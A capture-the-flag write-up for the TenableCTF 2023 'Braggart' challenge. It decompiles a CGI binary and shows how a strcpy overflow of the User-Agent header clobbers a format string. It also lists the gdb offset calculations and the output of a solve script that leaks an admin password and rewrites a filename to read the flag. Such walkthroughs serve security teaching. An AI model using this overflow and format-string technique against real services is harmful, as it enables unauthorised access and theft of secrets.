# Initial Analysis (Decompilation)

The writer utilized the IDA Pro decompiler to facilitate a clearer understanding of the program's flow within the output code.

In the main function, the objective is to call `printSecrets` function. However, prior to doing so, it is essential to retrieve the admin password from the environment variable named `AdminPass`. In order to input the password, you can utilize the x-password header.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int n[2]; // [rsp+8h] [rbp-88h] BYREF
  char *v5; // [rsp+10h] [rbp-80h]
  char *v6; // [rsp+18h] [rbp-78h]
  char *nptr; // [rsp+20h] [rbp-70h]
  char *s1; // [rsp+28h] [rbp-68h]
  char *s2; // [rsp+30h] [rbp-60h]
  char *v10; // [rsp+38h] [rbp-58h]
  char s[72]; // [rsp+40h] [rbp-50h] BYREF
  unsigned __int64 v12; // [rsp+88h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  v5 = getenv("QUERY_STRING");
  v6 = getenv("REQUEST_METHOD");
  nptr = getenv("HTTP_X_DEBUG");
  s1 = getenv("AdminPass");
  s2 = getenv("HTTP_X_PASSWORD");
  printf("%s\n\n", "Content-Type:text/html");
  if ( nptr && atoi(nptr) == 1 )
    setDebug();
  puts("<TITLE>Secrets</TITLE>");
  v10 = getenv("CONTENT_LENGTH");
  if ( v10 && (unsigned int)__isoc99_sscanf(v10, "%ld", n) == 1 )
  {
    if ( *(__int64 *)n <= 63 )
      fgets(s, n[0], stdin);
    else
      printf("<h4>Err:Too much data</h4>");
  }
  if ( s2 && !strcmp(s1, s2) )
    printSecrets();
  else
    printMain();
  return 0;
}
```

In the `printSecrets` function, the script will print the file located at the path `(workingDir)/brag`.
```
unsigned __int64 printSecrets()
{
  char v1; // [rsp+7h] [rbp-29h]
  char *s; // [rsp+8h] [rbp-28h]
  const char *src; // [rsp+10h] [rbp-20h]
  char *dest; // [rsp+18h] [rbp-18h]
  FILE *stream; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  s = (char *)malloc(8uLL);
  strcpy(&s[strlen(s)], "brag");
  src = getenv("workingDir");
  dest = (char *)malloc(0x40uLL);
  if ( debug )
    printDebugInfo();
  strcat(dest, src);
  strcat(dest, s);
  printf("<pre><h3> secrets : </h3>");
  stream = fopen(dest, "r");
  if ( stream )
  {
    while ( v1 != -1 )
    {
      putchar(v1);
      v1 = fgetc(stream);
    }
    fclose(stream);
  }
  printf("</pre>");
  return v6 - __readfsqword(0x28u);
}
```

The function printDebugInfo will be called when the `x-debug` header is set to 1
```
__int64 printDebugInfo()
{
  const char *src; // [rsp+8h] [rbp-808h]
  const char *srca; // [rsp+8h] [rbp-808h]
  char dest[1008]; // [rsp+10h] [rbp-800h] BYREF
  char format[8]; // [rsp+400h] [rbp-410h] BYREF
  __int64 v5; // [rsp+408h] [rbp-408h]
  char v6[1008]; // [rsp+410h] [rbp-400h] BYREF
  unsigned __int64 v7; // [rsp+808h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  *(_QWORD *)format = 29477LL;
  v5 = 0LL;
  memset(v6, 0, sizeof(v6));
  printf("<pre><h1>debug info</h1>");
  printf("<h3> Remote Addr : </h3>");
  src = getenv("REMOTE_ADDR");
  strcpy(dest, src);
  printf(format, src);
  printf("<h3> User Agent : </h3>");
  srca = getenv("HTTP_USER_AGENT");
  strcpy(dest, srca);
  printf(format, srca);
  printf("</pre><br><hr><br>");
  return 0LL;
}
```

# Vulnerability 

In the `printDebugInfo` function, the writer observed a vulnerability that there is a buffer overflow present, which can be exploited. This vulnerability can lead to other issues, such as a format string vulnerability, when `format` variable has been modified.

The strcpy function will copy the value of `srca`, which reads characters until a null byte character, and then copies them to `dest` variable. However, it's important to note that the length of the copy can exceed 1008 characters, resulting in a buffer overflow situation.

```
  char dest[1008]; // [rsp+10h] [rbp-800h] BYREF
  char format[8]; // [rsp+400h] [rbp-410h] BYREF
...
  strcpy(dest, srca);
  printf(format, srca);
```

# Exploit

Firstly, the writer will exploit a format string vulnerability to leak the admin password, which is required for calling the `printSecrets` function.

At this stage, you need to find the offset from environment `AdminPass`.

In gdb, `break *0x40137c`
```
     0x401377 <main+97>        call   0x401130 <getenv@plt>
 →   0x40137c <main+102>       mov    QWORD PTR [rbp-0x68], rax
     0x401380 <main+106>       lea    rax, [rip+0xcb4]        # 0x40203b
...
gef➤  x/gx $rbp-0x68
0x7fffffffdde8: 0x0000000000000000
```

0x7fffffffdde8 is environment `AdminPass`

In gdb, `break *printDebugInfo+157`

rsp will be 0x007fffffffd580 

Calculate offset ( 0x7fffffffdde8 - 0x007fffffffd580)/8 = 269 + 6(to make offset start from $rsp)

Run exploit to leak password 

```
└─# python2 solve.py
<TITLE>Secrets</TITLE>
<pre><h1>debug info</h1><h3> Remote Addr : </h3>10.1.1.5<h3> User Agent : </h3>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%s%275$sxbYP3h7Ua94c</pre><br><hr><br><H3>Ah Ah Ah, you didn't say the magic word.</H3>
<br><br><a href='sec.bak'>backup</a>
```

After successfully calling the `printSecrets` function, the server output  indicated the path flag is `/home/ctf/flag`, and the default opening path is `/home/ctf/brag`.

To update the file name value in the variable s from 'brag' to 'flag', you only need to modify 2 bytes.

In gdb, `set $rip=0x4014b3` to call printSecrets

in stack, you can see
```
0x007fffffffdd90│+0x0008: 0x000000004056b0  →  0x00000067617262 ("brag"?)
```

In gdb, `set $rip=0x401527` to call printDebugInfo

rsp will be 0x007fffffffd568

then calculate offset (0x007fffffffdd90-0x007fffffffd568)/8 = 261 + 6

Run exploit to change name file from 'brag' to 'flag'
```
└─# python2 solve.py           
[*] '/root/Desktop/github/CTF/CTF/2023/TenableCTF/Reversing - Pwns/Braggart/sec.bak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
<TITLE>Secrets</TITLE>
<pre><h1>debug info</h1><h3> Remote Addr : </h3>10.1.1.5<h3> User Agent : </h3> 
--SKIP--
:</pre><br><hr><br><pre><h3> secrets : </h3>flag{f0rmat_th3m_str1ngz}
</pre>
```
## Flag

`flag{f0rmat_th3m_str1ngz}`